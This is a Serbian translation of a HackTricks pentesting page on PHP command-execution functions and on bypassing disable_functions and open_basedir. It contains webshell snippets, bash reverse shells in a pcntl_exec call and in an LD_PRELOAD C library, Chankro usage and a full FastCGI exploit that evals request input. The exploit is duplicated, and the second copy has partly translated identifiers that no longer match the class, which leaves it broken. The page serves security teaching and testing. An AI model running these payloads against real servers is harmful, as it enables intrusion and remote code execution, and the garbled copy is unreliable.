# PHP - Useful Functions & disable\_functions/open\_basedir bypass

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## PHP Komanda i Izvršavanje Koda

### PHP Izvršavanje Komande

**Napomena:** [p0wny-shell](https://github.com/flozz/p0wny-shell/blob/master/shell.php) php webshell može **automatski** proveriti i zaobići sledeće funkcije ako su neke od njih onemogućene.

**exec** - Vraća poslednju liniju izlaza komande

```bash
echo exec("uname  -a");
```

**passthru** - Prosleđuje izlaz komandi direktno u pregledač

```php
<?php
passthru($_GET['cmd']);
?>
```

This function allows an attacker to execute arbitrary commands on the server and display the output directly in the browser. It is commonly used to perform command injection attacks. By manipulating the `cmd` parameter in the URL, an attacker can execute any command they want on the server. This can lead to unauthorized access, data leakage, and other security vulnerabilities. It is important to sanitize user input and validate the commands being executed to prevent this type of attack.

```bash
echo passthru("uname -a");
```

**system** - Prosleđuje izlaz komandi direktno u pregledač i vraća poslednju liniju

```bash
echo system("uname -a");
```

**shell\_exec** - Vraća izlaz komandi

```bash
echo shell_exec("uname -a");
```

\`\` (backticks) - Isto kao i shell\_exec()

```bash
echo `uname -a`
```

**popen** - Otvora čitanje ili pisanje cevi ka procesu komande

```bash
echo fread(popen("/bin/ls /", "r"), 4096);
```

**proc\_open** - Slično kao popen(), ali sa većim stepenom kontrole

```bash
proc_close(proc_open("uname -a",array(),$something));
```

**preg\_replace**

**preg\_replace** je funkcija u PHP-u koja se koristi za zamenu uzoraka u nizu ili stringu. Ova funkcija koristi regularne izraze za pronalaženje i zamenu određenih delova teksta.

Evo sintakse funkcije:

```php
preg_replace($pattern, $replacement, $subject);
```

* `$pattern` predstavlja regularni izraz koji se koristi za pronalaženje dela teksta koji želimo da zamenimo.
* `$replacement` predstavlja string ili niz koji se koristi za zamenu pronađenog dela teksta.
* `$subject` predstavlja niz ili string u kojem želimo da izvršimo zamenu.

Ova funkcija je veoma korisna prilikom manipulacije tekstom, kao i prilikom obrade korisničkog unosa. Međutim, treba biti oprezan prilikom korišćenja ove funkcije, jer nepravilno korišćenje može dovesti do ranjivosti kao što su XSS napadi ili SQL injection.

Uvek treba proveriti i validirati korisnički unos pre nego što se koristi **preg\_replace** funkcija kako bi se sprečile potencijalne ranjivosti.

```php
<?php preg_replace('/.*/e', 'system("whoami");', ''); ?>
```

**pcntl\_exec** - Izvršava program (podrazumevano u modernoj i ne tako modernoj PHP verziji, morate učitati modul `pcntl.so` da biste koristili ovu funkciju)

```bash
pcntl_exec("/bin/bash", ["-c", "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"]);
```

**mail / mb\_send\_mail** - Ova funkcija se koristi za slanje mejlova, ali se može zloupotrebiti kako bi se ubacili proizvoljni komandi unutar parametra `$options`. Ovo je zato što **php `mail` funkcija** obično poziva `sendmail` binarni fajl unutar sistema i omogućava vam da **dodate dodatne opcije**. Međutim, nećete moći videti izlaz izvršene komande, pa se preporučuje da kreirate skriptu koja upisuje izlaz u fajl, izvršite je koristeći mail, i ispišete izlaz:

```bash
file_put_contents('/www/readflag.sh', base64_decode('IyEvYmluL3NoCi9yZWFkZmxhZyA+IC90bXAvZmxhZy50eHQKCg==')); chmod('/www/readflag.sh', 0777);  mail('', '', '', '', '-H \"exec /www/readflag.sh\"'); echo file_get_contents('/tmp/flag.txt');
```

**dl** - Ova funkcija se može koristiti za dinamičko učitavanje PHP ekstenzije. Ova funkcija neće uvek biti prisutna, pa trebate proveriti da li je dostupna pre nego što pokušate da je iskoristite. Pročitajte [ovu stranicu da biste naučili kako iskoristiti ovu funkciju](disable\_functions-bypass-dl-function.md).

### Izvršavanje PHP koda

Osim eval funkcije, postoje i druge metode za izvršavanje PHP koda: include/require se mogu koristiti za izvršavanje udaljenog PHP koda u obliku ranjivosti lokalnog uključivanja fajlova i udaljenog uključivanja fajlova.

```php
${<php code>}              // If your input gets reflected in any PHP string, it will be executed.
eval()
assert()                   //  identical to eval()
preg_replace('/.*/e',...)  // e does an eval() on the match
create_function()          // Create a function and use eval()
include()
include_once()
require()
require_once()
$_GET['func_name']($_GET['argument']);

$func = new ReflectionFunction($_GET['func_name']);
$func->invoke();
// or
$func->invokeArgs(array());

// or serialize/unserialize function
```

## disable\_functions & open\_basedir

**Onemogućene funkcije** su podešavanje koje se može konfigurisati u `.ini` fajlovima u PHP-u i koje će **zabraniti** korišćenje navedenih **funkcija**. **Open basedir** je podešavanje koje PHP-u pokazuje folder na koji može pristupiti.\
PHP podešavanje se obično konfiguriše u putanji _/etc/php7/conf.d_ ili sličnoj.

Oba podešavanja se mogu videti u izlazu **`phpinfo()`**:

![](https://0xrick.github.io/images/hackthebox/kryptos/17.png)

![](<../../../../.gitbook/assets/image (347).png>)

## open\_basedir Bypass

`open_basedir` će konfigurisati foldere na koje PHP može pristupiti, nećete moći da pišete/čitate/izvršavate bilo koji fajl van tih foldera, ali takođe nećete moći ni da **izlistate** druge direktorijume.\
Međutim, ako nekako uspete da izvršite proizvoljni PHP kod, možete **pokušati** sledeći deo **koda** da biste pokušali da **zaobiđete** ograničenje.

### Izlistavanje direktorijuma sa glob:// zaobilaženjem

U ovom prvom primeru koristi se `glob://` protokol sa nekim zaobilaženjem putanje:

```php
<?php
$file_list = array();
$it = new DirectoryIterator("glob:///v??/run/*");
foreach($it as $f) {
$file_list[] = $f->__toString();
}
$it = new DirectoryIterator("glob:///v??/run/.*");
foreach($it as $f) {
$file_list[] = $f->__toString();
}
sort($file_list);
foreach($file_list as $f){
echo "{$f}<br/>";
}
```

**Napomena1**: U putanji možete koristiti i `/e??/*` da biste naveli `/etc/*` i bilo koji drugi folder.\
**Napomena2**: Izgleda da je deo koda dupliciran, ali to je zapravo neophodno!\
**Napomena3**: Ovaj primer je koristan samo za listanje foldera, a ne za čitanje fajlova

### Potpuno zaobilaženje open\_basedir pomoću zloupotrebe FastCGI

Ako želite **saznati više o PHP-FPM i FastCGI** možete pročitati [prvi deo ove stranice](disable\_functions-bypass-php-fpm-fastcgi.md).\
Ako je **`php-fpm`** konfigurisan, možete ga zloupotrebiti da potpuno zaobiđete **open\_basedir**:

![](<../../../../.gitbook/assets/image (350).png>)

![](<../../../../.gitbook/assets/image (349).png>)

Napomena da prva stvar koju trebate uraditi je da pronađete gde se nalazi **unix socket php-fpm-a**. Obično se nalazi u `/var/run`, pa možete **koristiti prethodni kod da biste izlistali direktorijum i pronašli ga**.\
Kod preuzet [ovde](https://balsn.tw/ctf\_writeup/20190323-0ctf\_tctf2019quals/#wallbreaker-easy).

````php
<?php
/**
* Note : Code is released under the GNU LGPL
*
* Please do not change the header of this file
*
* This library is free software; you can redistribute it and/or modify it under the terms of the GNU
* Lesser General Public License as published by the Free Software Foundation; either version 2 of
* the License, or (at your option) any later version.
*
* This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
* without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
*
* See the GNU Lesser General Public License for more details.
*/
/**
* Handles communication with a FastCGI application
*
* @author      Pierrick Charron <pierrick@webstart.fr>
* @version     1.0
*/
class FCGIClient
{
const VERSION_1            = 1;
const BEGIN_REQUEST        = 1;
const ABORT_REQUEST        = 2;
const END_REQUEST          = 3;
const PARAMS               = 4;
const STDIN                = 5;
const STDOUT               = 6;
const STDERR               = 7;
const DATA                 = 8;
const GET_VALUES           = 9;
const GET_VALUES_RESULT    = 10;
const UNKNOWN_TYPE         = 11;
const MAXTYPE              = self::UNKNOWN_TYPE;
const RESPONDER            = 1;
const AUTHORIZER           = 2;
const FILTER               = 3;
const REQUEST_COMPLETE     = 0;
const CANT_MPX_CONN        = 1;
const OVERLOADED           = 2;
const UNKNOWN_ROLE         = 3;
const MAX_CONNS            = 'MAX_CONNS';
const MAX_REQS             = 'MAX_REQS';
const MPXS_CONNS           = 'MPXS_CONNS';
const HEADER_LEN           = 8;
/**
* Socket
* @var Resource
*/
private $_sock = null;
/**
* Host
* @var String
*/
private $_host = null;
/**
* Port
* @var Integer
*/
private $_port = null;
/**
* Keep Alive
* @var Boolean
*/
private $_keepAlive = false;
/**
* Constructor
*
* @param String $host Host of the FastCGI application
* @param Integer $port Port of the FastCGI application
*/
public function __construct($host, $port = 9000) // and default value for port, just for unixdomain socket
{
$this->_host = $host;
$this->_port = $port;
}
/**
* Define whether or not the FastCGI application should keep the connection
* alive at the end of a request
*
* @param Boolean $b true if the connection should stay alive, false otherwise
*/
public function setKeepAlive($b)
{
$this->_keepAlive = (boolean)$b;
if (!$this->_keepAlive && $this->_sock) {
fclose($this->_sock);
}
}
/**
* Get the keep alive status
*
* @return Boolean true if the connection should stay alive, false otherwise
*/
public function getKeepAlive()
{
return $this->_keepAlive;
}
/**
* Create a connection to the FastCGI application
*/
private function connect()
{
if (!$this->_sock) {
//$this->_sock = fsockopen($this->_host, $this->_port, $errno, $errstr, 5);
$this->_sock = stream_socket_client($this->_host, $errno, $errstr, 5);
if (!$this->_sock) {
throw new Exception('Unable to connect to FastCGI application');
}
}
}
/**
* Build a FastCGI packet
*
* @param Integer $type Type of the packet
* @param String $content Content of the packet
* @param Integer $requestId RequestId
*/
private function buildPacket($type, $content, $requestId = 1)
{
$clen = strlen($content);
return chr(self::VERSION_1)         /* version */
. chr($type)                    /* type */
. chr(($requestId >> 8) & 0xFF) /* requestIdB1 */
. chr($requestId & 0xFF)        /* requestIdB0 */
. chr(($clen >> 8 ) & 0xFF)     /* contentLengthB1 */
. chr($clen & 0xFF)             /* contentLengthB0 */
. chr(0)                        /* paddingLength */
. chr(0)                        /* reserved */
. $content;                     /* content */
}
/**
* Build an FastCGI Name value pair
*
* @param String $name Name
* @param String $value Value
* @return String FastCGI Name value pair
*/
private function buildNvpair($name, $value)
{
$nlen = strlen($name);
$vlen = strlen($value);
if ($nlen < 128) {
/* nameLengthB0 */
$nvpair = chr($nlen);
} else {
/* nameLengthB3 & nameLengthB2 & nameLengthB1 & nameLengthB0 */
$nvpair = chr(($nlen >> 24) | 0x80) . chr(($nlen >> 16) & 0xFF) . chr(($nlen >> 8) & 0xFF) . chr($nlen & 0xFF);
}
if ($vlen < 128) {
/* valueLengthB0 */
$nvpair .= chr($vlen);
} else {
/* valueLengthB3 & valueLengthB2 & valueLengthB1 & valueLengthB0 */
$nvpair .= chr(($vlen >> 24) | 0x80) . chr(($vlen >> 16) & 0xFF) . chr(($vlen >> 8) & 0xFF) . chr($vlen & 0xFF);
}
/* nameData & valueData */
return $nvpair . $name . $value;
}
/**
* Read a set of FastCGI Name value pairs
*
* @param String $data Data containing the set of FastCGI NVPair
* @return array of NVPair
*/
private function readNvpair($data, $length = null)
{
$array = array();
if ($length === null) {
$length = strlen($data);
}
$p = 0;
while ($p != $length) {
$nlen = ord($data{$p++});
if ($nlen >= 128) {
$nlen = ($nlen & 0x7F << 24);
$nlen |= (ord($data{$p++}) << 16);
$nlen |= (ord($data{$p++}) << 8);
$nlen |= (ord($data{$p++}));
}
$vlen = ord($data{$p++});
if ($vlen >= 128) {
$vlen = ($nlen & 0x7F << 24);
$vlen |= (ord($data{$p++}) << 16);
$vlen |= (ord($data{$p++}) << 8);
$vlen |= (ord($data{$p++}));
}
$array[substr($data, $p, $nlen)] = substr($data, $p+$nlen, $vlen);
$p += ($nlen + $vlen);
}
return $array;
}
/**
* Decode a FastCGI Packet
*
* @param String $data String containing all the packet
* @return array
*/
private function decodePacketHeader($data)
{
$ret = array();
$ret['version']       = ord($data{0});
$ret['type']          = ord($data{1});
$ret['requestId']     = (ord($data{2}) << 8) + ord($data{3});
$ret['contentLength'] = (ord($data{4}) << 8) + ord($data{5});
$ret['paddingLength'] = ord($data{6});
$ret['reserved']      = ord($data{7});
return $ret;
}
/**
* Read a FastCGI Packet
*
* @return array
*/
private function readPacket()
{
if ($packet = fread($this->_sock, self::HEADER_LEN)) {
$resp = $this->decodePacketHeader($packet);
$resp['content'] = '';
if ($resp['contentLength']) {
$len  = $resp['contentLength'];
while ($len && $buf=fread($this->_sock, $len)) {
$len -= strlen($buf);
$resp['content'] .= $buf;
}
}
if ($resp['paddingLength']) {
$buf=fread($this->_sock, $resp['paddingLength']);
}
return $resp;
} else {
return false;
}
}
/**
* Get Informations on the FastCGI application
*
* @param array $requestedInfo information to retrieve
* @return array
*/
public function getValues(array $requestedInfo)
{
$this->connect();
$request = '';
foreach ($requestedInfo as $info) {
$request .= $this->buildNvpair($info, '');
}
fwrite($this->_sock, $this->buildPacket(self::GET_VALUES, $request, 0));
$resp = $this->readPacket();
if ($resp['type'] == self::GET_VALUES_RESULT) {
return $this->readNvpair($resp['content'], $resp['length']);
} else {
throw new Exception('Unexpected response type, expecting GET_VALUES_RESULT');
}
}
/**
* Execute a request to the FastCGI application
*
* @param array $params Array of parameters
* @param String $stdin Content
```php
* @return String
*/
public function request(array $params, $stdin)
{
$response = '';
$this->connect();
$request = $this->buildPacket(self::BEGIN_REQUEST, chr(0) . chr(self::RESPONDER) . chr((int) $this->_keepAlive) . str_repeat(chr(0), 5));
$paramsRequest = '';
foreach ($params as $key => $value) {
$paramsRequest .= $this->buildNvpair($key, $value);
}
if ($paramsRequest) {
$request .= $this->buildPacket(self::PARAMS, $paramsRequest);
}
$request .= $this->buildPacket(self::PARAMS, '');
if ($stdin) {
$request .= $this->buildPacket(self::STDIN, $stdin);
}
$request .= $this->buildPacket(self::STDIN, '');
fwrite($this->_sock, $request);
do {
$resp = $this->readPacket();
if ($resp['type'] == self::STDOUT || $resp['type'] == self::STDERR) {
$response .= $resp['content'];
}
} while ($resp && $resp['type'] != self::END_REQUEST);
var_dump($resp);
if (!is_array($resp)) {
throw new Exception('Bad request');
}
switch (ord($resp['content']{4})) {
case self::CANT_MPX_CONN:
throw new Exception('This app can\'t multiplex [CANT_MPX_CONN]');
break;
case self::OVERLOADED:
throw new Exception('New request rejected; too busy [OVERLOADED]');
break;
case self::UNKNOWN_ROLE:
throw new Exception('Role value not known [UNKNOWN_ROLE]');
break;
case self::REQUEST_COMPLETE:
return $response;
}
}
}
?>
<?php
// real exploit start here
if (!isset($_REQUEST['cmd'])) {
die("Check your input\n");
}
if (!isset($_REQUEST['filepath'])) {
$filepath = __FILE__;
}else{
$filepath = $_REQUEST['filepath'];
}
$req = '/'.basename($filepath);
$uri = $req .'?'.'command='.$_REQUEST['cmd'];
$client = new FCGIClient("unix:///var/run/php-fpm.sock", -1);
$code = "<?php eval(\$_REQUEST['command']);?>"; // php payload -- Doesnt do anything
$php_value = "allow_url_include = On\nopen_basedir = /\nauto_prepend_file = php://input";
//$php_value = "allow_url_include = On\nopen_basedir = /\nauto_prepend_file = http://127.0.0.1/e.php";
$params = array(
'GATEWAY_INTERFACE' => 'FastCGI/1.0',
'REQUEST_METHOD'    => 'POST',
'SCRIPT_FILENAME'   => $filepath,
'SCRIPT_NAME'       => $req,
'QUERY_STRING'      => 'command='.$_REQUEST['cmd'],
'REQUEST_URI'       => $uri,
'DOCUMENT_URI'      => $req,
#'DOCUMENT_ROOT'     => '/',
'PHP_VALUE'         => $php_value,
'SERVER_SOFTWARE'   => '80sec/wofeiwo',
'REMOTE_ADDR'       => '127.0.0.1',
'REMOTE_PORT'       => '9985',
'SERVER_ADDR'       => '127.0.0.1',
'SERVER_PORT'       => '80',
'SERVER_NAME'       => 'localhost',
'SERVER_PROTOCOL'   => 'HTTP/1.1',
'CONTENT_LENGTH'    => strlen($code)
);
// print_r($_REQUEST);
// print_r($params);
//echo "Call: $uri\n\n";
echo $client->request($params, $code)."\n";
?>
````

```php
* @return String
*/
public function zahtev(array $params, $stdin)
{
$response = '';
$this->povezi();
$zahtev = $this->napraviPaket(self::POCETAK_ZAHTEVA, chr(0) . chr(self::ODGOVARAC) . chr((int) $this->_keepAlive) . str_repeat(chr(0), 5));
$paramsZahtev = '';
foreach ($params as $kljuc => $vrednost) {
$paramsZahtev .= $this->napraviNvpar($kljuc, $vrednost);
}
if ($paramsZahtev) {
$zahtev .= $this->napraviPaket(self::PARAMETRI, $paramsZahtev);
}
$zahtev .= $this->napraviPaket(self::PARAMETRI, '');
if ($stdin) {
$zahtev .= $this->napraviPaket(self::STANDARDNI_UNOS, $stdin);
}
$zahtev .= $this->napraviPaket(self::STANDARDNI_UNOS, '');
fwrite($this->_sock, $zahtev);
do {
$odgovor = $this->procitajPaket();
if ($odgovor['tip'] == self::STANDARDNI_IZLAZ || $odgovor['tip'] == self::STANDARDNA_GRESKA) {
$response .= $odgovor['sadrzaj'];
}
} while ($odgovor && $odgovor['tip'] != self::KRAJ_ZAHTEVA);
var_dump($odgovor);
if (!is_array($odgovor)) {
throw new Exception('Loš zahtev');
}
switch (ord($odgovor['sadrzaj']{4})) {
case self::NE_MOZE_MPX_CONN:
throw new Exception('Ova aplikacija ne može da multiplexuje [NE_MOZE_MPX_CONN]');
break;
case self::PREOPTEREĆENO:
throw new Exception('Novi zahtev odbijen; previše zauzeto [PREOPTEREĆENO]');
break;
case self::NEPOZNATA_ULOGA:
throw new Exception('Vrednost uloge nije poznata [NEPOZNATA_ULOGA]');
break;
case self::ZAHTJEV_ZAVRŠEN:
return $response;
}
}
}
?>
<?php
// pravi eksploatacija počinje ovde
if (!isset($_REQUEST['cmd'])) {
die("Proverite unos\n");
}
if (!isset($_REQUEST['filepath'])) {
$filepath = __FILE__;
}else{
$filepath = $_REQUEST['filepath'];
}
$req = '/'.basename($filepath);
$uri = $req .'?'.'command='.$_REQUEST['cmd'];
$client = new FCGIClient("unix:///var/run/php-fpm.sock", -1);
$code = "<?php eval(\$_REQUEST['command']);?>"; // php payload -- Ne radi ništa
$php_value = "allow_url_include = On\nopen_basedir = /\nauto_prepend_file = php://input";
//$php_value = "allow_url_include = On\nopen_basedir = /\nauto_prepend_file = http://127.0.0.1/e.php";
$params = array(
'GATEWAY_INTERFACE' => 'FastCGI/1.0',
'REQUEST_METHOD'    => 'POST',
'SCRIPT_FILENAME'   => $filepath,
'SCRIPT_NAME'       => $req,
'QUERY_STRING'      => 'command='.$_REQUEST['cmd'],
'REQUEST_URI'       => $uri,
'DOCUMENT_URI'      => $req,
#'DOCUMENT_ROOT'     => '/',
'PHP_VALUE'         => $php_value,
'SERVER_SOFTWARE'   => '80sec/wofeiwo',
'REMOTE_ADDR'       => '127.0.0.1',
'REMOTE_PORT'       => '9985',
'SERVER_ADDR'       => '127.0.0.1',
'SERVER_PORT'       => '80',
'SERVER_NAME'       => 'localhost',
'SERVER_PROTOCOL'   => 'HTTP/1.1',
'CONTENT_LENGTH'    => strlen($code)
);
// print_r($_REQUEST);
// print_r($params);
//echo "Call: $uri\n\n";
echo $client->zahtev($params, $code)."\n";
?>
```

Ovi skriptovi će komunicirati sa **unix socket-om php-fpm**-a (obično smeštenim u /var/run ako se koristi fpm) kako bi izvršili proizvoljni kod. Podešavanja `open_basedir` će biti prebrisana atributom **PHP\_VALUE** koji se šalje.\
Primetite kako se koristi `eval` da bi se izvršio PHP kod koji šaljete unutar parametra **cmd**.\
Takođe, primetite **komentarisani red 324**, možete ga odkomentarisati i **payload će automatski se povezati sa datom URL-om i izvršiti sadržani PHP kod**.\
Jednostavno pristupite `http://vulnerable.com:1337/l.php?cmd=echo file_get_contents('/etc/passwd');` da biste dobili sadržaj datoteke `/etc/passwd`.

{% hint style="warning" %}
Možda mislite da na isti način na koji smo prebrisali konfiguraciju `open_basedir` možemo **prebrisati `disable_functions`**. Pa, pokušajte, ali neće uspeti, izgleda da **`disable_functions` može biti konfigurisan samo u `.ini` php** konfiguracionoj datoteci i promene koje vršite koristeći PHP\_VALUE neće biti efektivne na ovoj specifičnoj postavci.
{% endhint %}

## Bypass disable\_functions

Ako uspete da izvršite PHP kod unutar mašine, verovatno želite da pređete na sledeći nivo i **izvršite proizvoljne sistemsko naredbe**. U ovoj situaciji je uobičajeno otkriti da su većina ili sve PHP **funkcije** koje omogućavaju **izvršavanje sistemskih naredbi onemogućene** u **`disable_functions`.**\
Pogledajmo kako možete zaobići ovu restrikciju (ako možete)

### Automatsko otkrivanje zaobilaženja

Možete koristiti alat [https://github.com/teambi0s/dfunc-bypasser](https://github.com/teambi0s/dfunc-bypasser) i on će vam pokazati koju funkciju (ako postoji) možete koristiti za **zaobilaženje** **`disable_functions`**.

### Zaobilaženje korišćenjem drugih sistemskih funkcija

Vratite se na početak ove stranice i **proverite da li je neka od funkcija za izvršavanje naredbi onemogućena i dostupna u okruženju**. Ako pronađete barem jednu od njih, moći ćete je koristiti za izvršavanje proizvoljnih sistemskih naredbi.

### LD\_PRELOAD zaobilaženje

Dobro je poznato da neke funkcije u PHP-u poput `mail()` će **izvršavati binarne datoteke unutar sistema**. Stoga, možete ih zloupotrebiti koristeći promenljivu okruženja `LD_PRELOAD` da bi se učitao proizvoljni biblioteka koja može izvršiti bilo šta.

#### Funkcije koje se mogu koristiti za zaobilaženje disable\_functions sa LD\_PRELOAD

* **`mail`**
* **`mb_send_mail`**: Efektivno kada je instaliran modul `php-mbstring`.
* **`imap_mail`**: Radi ako je prisutan modul `php-imap`.
* **`libvirt_connect`**: Zahteva modul `php-libvirt-php`.
* **`gnupg_init`**: Može se koristiti sa instaliranim modulom `php-gnupg`.
* **`new imagick()`**: Ova klasa može biti zloupotrebljena za zaobilaženje restrikcija. Detaljne tehnike eksploatacije mogu se pronaći u sveobuhvatnom [**izveštaju ovde**](https://blog.bi0s.in/2019/10/23/Web/BSidesDelhi19-evalme/).

Možete [**ovde pronaći**](https://github.com/tarunkant/fuzzphunc/blob/master/lazyFuzzer.py) skriptu za ispitivanje koja je korišćena za pronalaženje ovih funkcija.

Ovde je biblioteka koju možete kompajlirati da biste zloupotrebili promenljivu okruženja `LD_PRELOAD`:

```php
#include <unistd.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>

uid_t getuid(void){
unsetenv("LD_PRELOAD");
system("bash -c \"sh -i >& /dev/tcp/127.0.0.1/1234 0>&1\"");
return 1;
}
```

#### Bypass korišćenjem Chankro-a

Da biste iskoristili ovu konfiguraciju, možete koristiti [**Chankro**](https://github.com/TarlogicSecurity/Chankro). Ovo je alat koji će **generisati PHP eksploit** koji trebate otpremiti na ranjivi server i izvršiti ga (pristupiti mu putem veba).\
**Chankro** će upisati unutar diska žrtve **biblioteku i obrnutu ljusku** koju želite izvršiti i koristiće trik\*\*`LD_PRELOAD` + PHP `mail()`\*\* funkciju da izvrši obrnutu ljusku.

Imajte na umu da da biste koristili **Chankro**, `mail` i `putenv` **ne smeju se pojaviti unutar liste `disable_functions`**.\
U sledećem primeru možete videti kako **kreirati Chankro eksploit** za **arch 64**, koji će izvršiti `whoami` i sačuvati izlaz u _/tmp/chankro\_shell.out_, Chankro će **upisati biblioteku i payload** u _/tmp_ i **konačni eksploit** će se zvati **bicho.php** (to je datoteka koju trebate otpremiti na server žrtve):

{% tabs %}
{% tab title="shell.sh" %}
```php
#!/bin/sh
whoami > /tmp/chankro_shell.out
```
{% endtab %}

{% tab title="Chankro" %}
```bash
python2 chankro.py --arch 64 --input shell.sh --path /tmp --output bicho.php
```
{% endtab %}
{% endtabs %}

Ako primetite da je funkcija **mail** blokirana onemogućenim funkcijama, možda i dalje možete koristiti funkciju **mb\_send\_mail**.\
Više informacija o ovoj tehnici i Chankro-u možete pronaći ovde: [https://www.tarlogic.com/en/blog/how-to-bypass-disable\_functions-and-open\_basedir/](https://www.tarlogic.com/en/blog/how-to-bypass-disable\_functions-and-open\_basedir/)

### "Bypass" korišćenjem PHP mogućnosti

Imajte na umu da pomoću **PHP**-a možete **čitati i pisati datoteke, kreirati direktorijume i menjati dozvole**.\
Čak možete i **izbaciti baze podataka**.\
Možda pomoću **PHP**-a možete **izlistati** sistem i pronaći način za eskalaciju privilegija/izvršavanje komandi (na primer, čitanje nekog privatnog SSH ključa).

Kreirao sam webshell koji olakšava izvođenje ovih radnji (imajte na umu da će vam većina webshellova takođe ponuditi ove opcije): [https://github.com/carlospolop/phpwebshelllimited](https://github.com/carlospolop/phpwebshelllimited)

### Bypass metode zavisne od modula/verzije

Postoji nekoliko načina zaobilaženja disable\_functions ako se koristi određeni modul ili iskorišćava određena verzija PHP-a:

* [**FastCGI/PHP-FPM (FastCGI Process Manager)**](disable\_functions-bypass-php-fpm-fastcgi.md)
* [**Bypass sa FFI - Foreign Function Interface omogućen**](https://github.com/carlospolop/hacktricks/blob/rs/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable\_functions-open\_basedir-bypass/broken-reference/README.md)
* [**Bypass putem mem**](disable\_functions-bypass-via-mem.md)
* [**mod\_cgi**](disable\_functions-bypass-mod\_cgi.md)
* [**PHP Perl Extension Safe\_mode**](disable\_functions-bypass-php-perl-extension-safe\_mode-bypass-exploit.md)
* [**dl funkcija**](disable\_functions-bypass-dl-function.md)
* [**Ovaj exploit**](https://github.com/mm0r1/exploits/tree/master/php-filter-bypass)
* 5.\* - iskoristiv sa manjim izmenama u PoC-u
* 7.0 - sve verzije do danas
* 7.1 - sve verzije do danas
* 7.2 - sve verzije do danas
* 7.3 - sve verzije do danas
* 7.4 - sve verzije do danas
* 8.0 - sve verzije do danas
* [**Od 7.0 do 8.0 exploit (samo za Unix)**](https://github.com/mm0r1/exploits/blob/master/php-filter-bypass/exploit.php)
* [**PHP 7.0=7.4 (\*nix)**](disable\_functions-bypass-php-7.0-7.4-nix-only.md#php-7-0-7-4-nix-only)
* [**Imagick 3.3.0 PHP >= 5.4**](disable\_functions-bypass-imagick-less-than-3.3.0-php-greater-than-5.4-exploit.md)
* [**PHP 5.x Shellsock**](disable\_functions-php-5.x-shellshock-exploit.md)
* [**PHP 5.2.4 ionCube**](disable\_functions-php-5.2.4-ioncube-extension-exploit.md)
* [**PHP <= 5.2.9 Windows**](disable\_functions-bypass-php-less-than-5.2.9-on-windows.md)
* [**PHP 5.2.4/5.2.5 cURL**](disable\_functions-bypass-php-5.2.4-and-5.2.5-php-curl.md)
* [**PHP 5.2.3 -Win32std**](disable\_functions-bypass-php-5.2.3-win32std-ext-protections-bypass.md)
* [**PHP 5.2 FOpen exploit**](disable\_functions-bypass-php-5.2-fopen-exploit.md)
* [**PHP 4 >= 4.2.-, PHP 5 pcntl\_exec**](disable\_functions-bypass-php-4-greater-than-4.2.0-php-5-pcntl\_exec.md)

### **Automatski alat**

Sledeći skript pokušava neke od ovde komentarisanih metoda:\
[https://github.com/l3m0n/Bypass\_Disable\_functions\_Shell/blob/master/shell.php](https://github.com/l3m0n/Bypass\_Disable\_functions\_Shell/blob/master/shell.php)

## Ostale zanimljive PHP funkcije

### Lista funkcija koje prihvataju povratne pozive

Ove funkcije prihvataju string parametar koji se može koristiti za pozivanje funkcije po izboru napadača. Zavisno od funkcije, napadač može ili ne mora imati mogućnost prosleđivanja parametra. U tom slučaju, funkcija za otkrivanje informacija poput phpinfo() može se koristiti.

[Povratni pozivi / Callable](https://www.php.net/manual/en/language.types.callable.php)

[Sledeće liste odavde](https://stackoverflow.com/questions/3115559/exploitable-php-functions)

```php
// Function => Position of callback arguments
'ob_start' => 0,
'array_diff_uassoc' => -1,
'array_diff_ukey' => -1,
'array_filter' => 1,
'array_intersect_uassoc' => -1,
'array_intersect_ukey' => -1,
'array_map' => 0,
'array_reduce' => 1,
'array_udiff_assoc' => -1,
'array_udiff_uassoc' => array(-1, -2),
'array_udiff' => -1,
'array_uintersect_assoc' => -1,
'array_uintersect_uassoc' => array(-1, -2),
'array_uintersect' => -1,
'array_walk_recursive' => 1,
'array_walk' => 1,
'assert_options' => 1,
'uasort' => 1,
'uksort' => 1,
'usort' => 1,
'preg_replace_callback' => 1,
'spl_autoload_register' => 0,
'iterator_apply' => 1,
'call_user_func' => 0,
'call_user_func_array' => 0,
'register_shutdown_function' => 0,
'register_tick_function' => 0,
'set_error_handler' => 0,
'set_exception_handler' => 0,
'session_set_save_handler' => array(0, 1, 2, 3, 4, 5),
'sqlite_create_aggregate' => array(2, 3),
'sqlite_create_function' => 2,
```

### Otkrivanje informacija

Većina ovih poziva funkcija nisu "sinks" (mesta gde se podaci mogu izgubiti). Ali može biti ranjivost ako su podaci koji se vraćaju vidljivi napadaču. Ako napadač može videti phpinfo(), to je definitivno ranjivost.

```php
phpinfo
posix_mkfifo
posix_getlogin
posix_ttyname
getenv
get_current_user
proc_get_status
get_cfg_var
disk_free_space
disk_total_space
diskfreespace
getcwd
getlastmo
getmygid
getmyinode
getmypid
getmyuid
```

### Ostalo

Ova sekcija sadrži nekoliko drugih korisnih funkcija i trikova koji se mogu koristiti za zaobilaženje funkcija `disable_functions` i `open_basedir` u PHP-u.

#### `dl()`

